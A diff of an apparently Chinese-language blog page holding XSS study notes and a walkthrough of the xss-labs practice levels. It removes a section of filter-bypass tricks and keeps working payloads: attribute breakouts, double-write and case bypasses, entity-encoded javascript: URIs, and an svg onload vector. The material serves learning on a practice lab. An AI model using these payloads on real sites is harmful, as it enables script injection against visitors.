@@ -161,116 +161,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="XSS基础理论："><a href="#XSS基础理论：" class="headerlink" title="XSS基础理论："></a>XSS基础理论：</h2><p><strong>概念</strong>：跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见的Web安全漏洞，攻击者通过在受害者的浏览器中注入恶意脚本来执行恶意行为。这种攻击通常利用Web应用程序没有对用户输入的数据进行足够的过滤和验证。</p>
-<p><strong>分类</strong>：</p>
-<p><em>反射型</em></p>
-<ul>
-<li>非持久性跨站点脚本攻击</li>
-<li>攻击是一次性的，仅对当次的页面访问产生影响</li>
-</ul>
-<p><em>存储型</em></p>
-<ul>
-<li>持久型跨站点脚本</li>
-<li>攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在</li>
-</ul>
-<p><em>DOM型</em></p>
-<ul>
-<li>既可能是反射型的，也有可能是存储型的</li>
-<li>基于文档对象模型(Document Objeet Model,DOM)的一种漏洞</li>
-</ul>
-<p><strong>XSS触发标签</strong></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSS常见的触发标签_xss&lt; img src onerror&#x3D;alt&#x3D;’’+document.domain&gt;”怎么触发-CSDN博客</a></p>
-<p>&#x2F;&#x2F;下面是一堆不知道有没有用的绕过方式，有空再看</p>
-<p><strong>XSS的绕过</strong>：</p>
-<p>1.关键词绕过：a.大小写绕过    eg:xxxxx?q&#x3D;<sCriPt>alert(1)<sCriPt></p>
-<p>​			 b.拼接绕过</p>
-<p>​			c.函数替换</p>
-<p>​			d.嵌套绕过</p>
-<p>​			e.赋值绕过</p>
-<p>2.编码绕过：a.html实体编码转义		b.url编码绕过</p>
-<p>​		src属性：</p>
-<p>​			0x01:<code>&lt;script&gt;</code>标签</p>
-<p>​			<code>	src</code>属性用于指定引入外部JavaScript文件的URL</p>
-<p>​			0x02:<code>&lt;iframe&gt;</code>标签</p>
-<p>​			<code>src</code>属性用于指定要嵌入的另一个文档的URL。</p>
-<p>​		href属性：</p>
-<p>​			0x01:<code>&lt;link&gt;</code>标签</p>
-<p>​			<code>href</code>属性用于指定外部样式表的URL。</p>
-<p>​			0x02:<code>&lt;base&gt;</code>标签</p>
-<p>​			<code>href</code>属性用于指定基准URL，所有相对URL都将以该URL为基础。</p>
-<p>​			0x03:<code>&lt;area&gt;</code>标签</p>
-<p>​			<code>href</code>属性用于指定图像地图中区域的URL。</p>
-<p>3.空格绕过</p>
-<p>不同位置的空格绕过方式是不一样的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>A位置： /，/123/，%09，%0A，%0C，%0D，%20</p>
-<p>B位置：%09，%0A，%0C，%0D，%20</p>
-<p>C位置：%0B，/**/ （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</p>
-<p>D位置：%09，%0A，%0C，%0D，%20，//，></p>
-<p>4.（）绕过</p>
-<p>01.利用反引号</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert`1`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>02.throw绕过</p>
-<script>alert;throw 1
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>5.单引号过滤</p>
-<p>01.可以利用斜杠替换</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/Evi1s7/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>02.利用反引号替换</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(`Evi1s7`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>6.alert过滤绕过</p>
-<p>01.利用其他JavaScript的函数替换</p>
-<p>prompt()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(&#x27;Evi1s7&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>confirm()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(&#x27;Evi1s7&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>console.log()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(&#x27;Evi1s7&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>document.write()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.write(&#x27;Evi1s7&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>02.利用编码绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;Function`a$&#123;atob`YWxlcnQoMSk=`&#125;```&quot;&gt;</span><br><span class="line">#alert(1)</span><br><span class="line">&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;aaa&lt;/a&gt;</span><br><span class="line">#alert(1)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>7.长度限制</p>
-<p>可以利用拆分法</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(a)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>利用eval()函数将字符串解析为可执行的代码，从而进行拼接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;a href=http://VPS-IP:port&gt;Evi1s7&lt;/a&gt;&quot;)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>8.分号绕过</p>
-<p>当只过滤了分号时，可以利用花括号进行语句隔离</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>9.绕过CSP</p>
-<h2 id="XSS-lab"><a href="#XSS-lab" class="headerlink" title="XSS-lab"></a>XSS-lab</h2><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level   1"></a>Level   1</h4><p>//反射型xss注入</p>
-<p>// JS弹窗函数alert()</p>
-<p>遇到?name=test，不妨直接试试</p>
+        <h2 id="XSS-lab"><a href="#XSS-lab" class="headerlink" title="XSS-lab"></a>XSS-lab</h2><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level   1"></a>Level   1</h4><p>&#x2F;&#x2F;反射型xss注入</p>
+<p>&#x2F;&#x2F; JS弹窗函数alert()</p>
+<p>遇到?name&#x3D;test，不妨直接试试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 
 
 <h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level   2"></a>Level   2</h4><p>同1</p>
-<p>查看源码发现<>被编码了,用双引号把左右两边<strong>属性的引号</strong>和<strong>标签</strong>闭合即可</p>
+<p>查看源码发现&lt;&gt;被编码了,用双引号把左右两边<strong>属性的引号</strong>和<strong>标签</strong>闭合即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>
 
 <p>注：</p>
@@ -278,7 +177,7 @@
 
 
 
-<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level   3"></a>Level   3</h4><p>//使用不带有<>的事件代码，例如：onfocus、onmouseover</p>
+<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level   3"></a>Level   3</h4><p>&#x2F;&#x2F;使用不带有&lt;&gt;的事件代码，例如：onfocus、onmouseover</p>
 <p>先要知道：onfocus 事件在对象获得焦点时发生。 onfocus 通常用于 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input&gt;、&lt;select&gt; 以及&lt;a&gt;</span><br></pre></td></tr></table></figure>
 
@@ -289,7 +188,7 @@
 
 
 <h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level   4"></a>Level   4</h4><p>同3，单引号改为双引号</p>
-<h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level   5"></a>Level   5</h4><p>//a标签的href属性</p>
+<h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level   5"></a>Level   5</h4><p>&#x2F;&#x2F;a标签的href属性</p>
 <p>观察发现：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、&lt;script&gt;标签会被替换成&lt;scr_ipt&gt;</span><br><span class="line"></span><br><span class="line">2、onfocus事件会被替换成on_focus</span><br></pre></td></tr></table></figure>
 
@@ -300,13 +199,13 @@
 
 <p>最后点一下蓝色的test即可</p>
 <p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/202407101513545.png" alt="联想截图_20240710113615"></p>
-<h4 id="Level-6"><a href="#Level-6" class="headerlink" title="Level   6"></a>Level   6</h4><p>//大小写绕过</p>
+<h4 id="Level-6"><a href="#Level-6" class="headerlink" title="Level   6"></a>Level   6</h4><p>&#x2F;&#x2F;大小写绕过</p>
 <p>随便放一条语句进去发现过滤了好多东西，绕过试试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sCript&gt;alert()&lt;/sCript&gt;&quot;</span><br></pre></td></tr></table></figure>
 
 
 
-<h4 id="Level-7"><a href="#Level-7" class="headerlink" title="Level   7"></a>Level   7</h4><p>//双写绕过</p>
+<h4 id="Level-7"><a href="#Level-7" class="headerlink" title="Level   7"></a>Level   7</h4><p>&#x2F;&#x2F;双写绕过</p>
 <p>仍然是随便放一句话进去测试，查看源代码</p>
 <p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/202407101517311.png" alt="image-20240710151749264"></p>
 <p>看这里的最后一行，发现on和script没掉了，用双写绕过，把on和script补回来</p>
@@ -314,7 +213,7 @@
 
 
 
-<h4 id="Level-8"><a href="#Level-8" class="headerlink" title="Level   8"></a>Level   8</h4><p>//href属性自动解析Unicode编码</p>
+<h4 id="Level-8"><a href="#Level-8" class="headerlink" title="Level   8"></a>Level   8</h4><p>&#x2F;&#x2F;href属性自动解析Unicode编码</p>
 <p>JavaScript伪协议：</p>
 <p>它的功能是将</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaScript：...</span><br></pre></td></tr></table></figure>
@@ -334,7 +233,7 @@
 
 
 
-<p>//html实体编码</p>
+<p>&#x2F;&#x2F;html实体编码</p>
 <p>测试一个语句，发现ri变成了r_i</p>
 <p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/202407101610121.png" alt="image-20240710161018041"></p>
 <p>试试html实体编码（下面是ri的编码）</p>
@@ -345,16 +244,16 @@
 
 
 
-<h4 id="Level-9"><a href="#Level-9" class="headerlink" title="Level   9"></a>Level   9</h4><p>//strpos()函数绕过		</p>
-<p>不知道为什么别人能看到php的源码，经分析得知上传的语句必须包含"http://"，否则会出现“链接不合法”的提示。</p>
-<p>但是我们好像不太需要这个"http://"，所以给他注释掉就行。</p>
+<h4 id="Level-9"><a href="#Level-9" class="headerlink" title="Level   9"></a>Level   9</h4><p>&#x2F;&#x2F;strpos()函数绕过		</p>
+<p>不知道为什么别人能看到php的源码，经分析得知上传的语句必须包含”http:&#x2F;&#x2F;“，否则会出现“链接不合法”的提示。</p>
+<p>但是我们好像不太需要这个”http:&#x2F;&#x2F;“，所以给他注释掉就行。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</span><br></pre></td></tr></table></figure>
 
 <p>前面一串是js伪协议的unicode编码</p>
 <h4 id="Level-10"><a href="#Level-10" class="headerlink" title="Level   10"></a>Level   10</h4><p>点进去输入框什么的都没有，于是查看源代码，发现都给他用hidden隐藏起来了，于是回去修改一下网页源代码，把hidden改为text，出现了输入框，但是没得提交，所以想到直接把value的值给改成注入语句。总共有三个嘛，都试一试，发现第三个改好之后就成功了。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/202407111029991.png" alt="联想截图_20240711102701"></p>
-<h4 id="Level-11-12-13-14"><a href="#Level-11-12-13-14" class="headerlink" title="Level   11&&12&&13&&14"></a>Level   11&&12&&13&&14</h4><p>同10，一模一样的做法都可以做</p>
-<p>//14关可能不一样一点，在iframe那里加一句即可。</p>
+<h4 id="Level-11-12-13-14"><a href="#Level-11-12-13-14" class="headerlink" title="Level   11&amp;&amp;12&amp;&amp;13&amp;&amp;14"></a>Level   11&amp;&amp;12&amp;&amp;13&amp;&amp;14</h4><p>同10，一模一样的做法都可以做</p>
+<p>&#x2F;&#x2F;14关可能不一样一点，在iframe那里加一句即可。</p>
 <h4 id="Level-15"><a href="#Level-15" class="headerlink" title="Level   15"></a>Level   15</h4><p>查看源码发现里面出现了ng-include</p>
 <p>注：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</span><br></pre></td></tr></table></figure>
@@ -375,9 +274,9 @@
 <p>接下来选一个不常用的标签来绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0Aonload=alert()&gt;</span><br></pre></td></tr></table></figure>
 
-<h5 id="onload加载完成事件"><a href="#onload加载完成事件" class="headerlink" title="//onload加载完成事件"></a>//onload加载完成事件</h5><p><strong>onload事件是浏览器解析完页面之后就会自动触发的事件。</strong></p>
+<h5 id="onload加载完成事件"><a href="#onload加载完成事件" class="headerlink" title="&#x2F;&#x2F;onload加载完成事件"></a>&#x2F;&#x2F;onload加载完成事件</h5><p><strong>onload事件是浏览器解析完页面之后就会自动触发的事件。</strong></p>
 <p>Level 17之后全需要flash插件，先不做了。</p>
-</sCriPt></p>
+
       
 
       
